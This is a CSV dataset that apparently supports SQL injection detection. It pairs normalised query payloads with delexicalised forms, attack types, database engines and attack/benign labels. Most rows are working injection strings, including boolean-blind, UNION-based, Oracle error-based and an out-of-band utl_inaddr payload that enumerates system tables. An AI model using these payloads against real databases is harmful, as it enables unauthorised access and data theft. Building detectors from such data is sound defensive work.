payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
"1"" ) where 2016 = 2016 and ( 1547 = 2093 ) *2093--",__INT__ ) where __INT__ = __INT__ and ( __INT__ = __INT__ ) * __INT__ - -,boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""-4262%\' ) ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'"" or username = ""-1549\' ) and ( \'fnwx\' = \'fnwx""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,boolean_blind,oracle,0.8,True,original,silver
"select * from users WHERE username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-7770\' where 6503 = 6503","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ where __INT__ = __INT__",union_based,oracle,0.95,True,original,gold
1 ) ) and ( 3020 = 3020 ) *6703 and ( ( 3078 = 3078,__INT__ ) ) and ( __INT__ = __INT__ ) * __INT__ and ( ( __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
SELECT Count ( * ) AS fairly,select count ( * ) as __IDENT__,benign,generic,1.0,False,original,gold
"1' and make_set ( 4952 = 7129,7129 )","__INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ )",boolean_blind,mysql,0.7,True,original,bronze
SELECT indeed ( s ) FROM rise LEFT JOIN,select __IDENT__ ( __IDENT__ ) from __IDENT__ left join,benign,generic,1.0,False,original,gold
"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--","- __INT__ union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.85,True,original,silver
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i",__STR__ __IDENT__ __STR__ __IDENT__,out_of_band,oracle,0.95,True,original,gold
SELECT * FROM thumb ORDER BY belong,select * from __IDENT__ order by __IDENT__,benign,generic,1.0,False,original,gold
"SELECT seasonID AS ID, means AS known FROM weigh","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
